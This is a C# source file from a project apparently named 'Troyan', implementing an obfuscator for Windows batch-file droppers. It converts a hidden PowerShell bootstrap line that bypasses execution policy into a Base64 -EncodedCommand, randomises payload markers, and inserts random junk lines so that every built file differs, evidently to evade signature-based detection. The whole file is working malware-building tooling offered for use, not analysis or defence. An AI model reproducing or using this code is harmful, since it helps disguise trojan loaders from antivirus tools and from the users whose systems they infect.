using System.Text;
using System.Text.RegularExpressions;

namespace Troyan.Core;

/// <summary>
/// Light CMD obfuscation: random Base64 markers, PowerShell <c>-EncodedCommand</c> (UTF-16LE Base64),
/// and per-build junk lines at begin / middle / end so each output file differs.
/// Path of the .cmd is passed via a short-lived env var because <c>%~f0</c> is not expanded inside an encoded script.
/// </summary>
public sealed class TroyanCmdObfuscator : ITroyanCmdObfuscator
{
    private const string BeginMarker = "::BEGIN_B64::";
    private const string EndMarker = "::END_B64::";

    private static readonly Random Shared = new();

    private static readonly Regex CommandLineRegex = new(
        @"^(?<prefix>\s*powershell\.exe\s+-NoProfile\s+-ExecutionPolicy\s+Bypass\s+-WindowStyle\s+Hidden\s+)-Command\s+""(?<script>.*)""\s*$",
        RegexOptions.Multiline | RegexOptions.CultureInvariant);

    public string Obfuscate(string cmdText)
    {
        ArgumentException.ThrowIfNullOrEmpty(cmdText);

        if (!cmdText.Contains(BeginMarker, StringComparison.Ordinal)
            || !cmdText.Contains(EndMarker, StringComparison.Ordinal))
            throw new InvalidOperationException("CMD text must contain ::BEGIN_B64:: and ::END_B64:: markers.");

        var beginTag = "::" + PowerShellObfuscator.GenerateRandomName() + "::";
        var endTag = "::" + PowerShellObfuscator.GenerateRandomName() + "::";
        while (string.Equals(beginTag, endTag, StringComparison.Ordinal))
            endTag = "::" + PowerShellObfuscator.GenerateRandomName() + "::";

        var envName = "_" + PowerShellObfuscator.GenerateRandomName();

        var withMarkers = cmdText
            .Replace(BeginMarker, beginTag, StringComparison.Ordinal)
            .Replace(EndMarker, endTag, StringComparison.Ordinal);

        var match = CommandLineRegex.Match(withMarkers);
        if (!match.Success)
            throw new InvalidOperationException("CMD text must contain a powershell.exe -Command \"...\" bootstrap line.");

        var script = match.Groups["script"].Value;
        script = script.Replace("$p='%~f0'", "$p=$env:" + envName, StringComparison.Ordinal);
        script = script.Replace(
            "(?s)::BEGIN_B64::\\r?\\n(.+?)\\r?\\n::END_B64::",
            "(?s)" + Regex.Escape(beginTag) + "\\r?\\n(.+?)\\r?\\n" + Regex.Escape(endTag),
            StringComparison.Ordinal);

        var encoded = Convert.ToBase64String(Encoding.Unicode.GetBytes(script));
        var prefix = match.Groups["prefix"].Value;
        var newLine = prefix + "-EncodedCommand " + encoded;

        var setLine = "set \"" + envName + "=%~f0\"";
        var replaced = CommandLineRegex.Replace(withMarkers, newLine, 1);
        var psIdx = replaced.IndexOf(newLine, StringComparison.Ordinal);
        if (psIdx < 0)
            throw new InvalidOperationException("Failed to rewrite powershell bootstrap line.");

        replaced = replaced.Insert(psIdx, setLine + Environment.NewLine);
        return InjectNoise(replaced);
    }

    /// <summary>Inserts junk REM/set blocks after <c>@echo off</c>, between bootstrap and payload, and after the end marker.</summary>
    private static string InjectNoise(string cmd)
    {
        var nl = cmd.Contains("\r\n", StringComparison.Ordinal) ? "\r\n" : "\n";
        var headNoise = BuildNoiseBlock(Shared.Next(4, 10), nl);
        var midNoise = BuildNoiseBlock(Shared.Next(4, 10), nl);
        var tailNoise = BuildNoiseBlock(Shared.Next(4, 10), nl);

        var echoIdx = cmd.IndexOf("@echo off", StringComparison.OrdinalIgnoreCase);
        if (echoIdx < 0)
            throw new InvalidOperationException("CMD text must contain @echo off.");

        var afterEcho = cmd.IndexOf(nl, echoIdx, StringComparison.Ordinal);
        if (afterEcho < 0)
            afterEcho = echoIdx + "@echo off".Length;
        else
            afterEcho += nl.Length;

        var withHead = cmd[..afterEcho] + headNoise + cmd[afterEcho..];

        var exitIdx = withHead.IndexOf("exit /b", StringComparison.OrdinalIgnoreCase);
        if (exitIdx < 0)
            throw new InvalidOperationException("CMD text must contain exit /b.");

        var afterExit = withHead.IndexOf(nl, exitIdx, StringComparison.Ordinal);
        if (afterExit < 0)
            afterExit = exitIdx + "exit /b".Length;
        else
            afterExit += nl.Length;

        return withHead[..afterExit] + midNoise + withHead[afterExit..] + nl + tailNoise;
    }

    private static string BuildNoiseBlock(int lineCount, string nl)
    {
        var sb = new StringBuilder();
        for (var i = 0; i < lineCount; i++)
            sb.Append(NoiseLine()).Append(nl);
        return sb.ToString();
    }

    private static string NoiseLine()
    {
        var a = PowerShellObfuscator.GenerateRandomName();
        var b = PowerShellObfuscator.GenerateRandomName();
        return Shared.Next(0, 5) switch
        {
            0 => "REM " + a + " " + b,
            1 => "set \"" + a + "=" + b + Shared.Next(1000, 9999) + "\"",
            2 => "set /a " + a + "=" + Shared.Next(1, 50) + "+" + Shared.Next(1, 50) + " >nul 2>&1",
            3 => "if 0==1 echo " + a,
            _ => "if not defined " + a + " set \"" + a + "=" + Shared.Next(10, 99) + "\"",
        };
    }
}
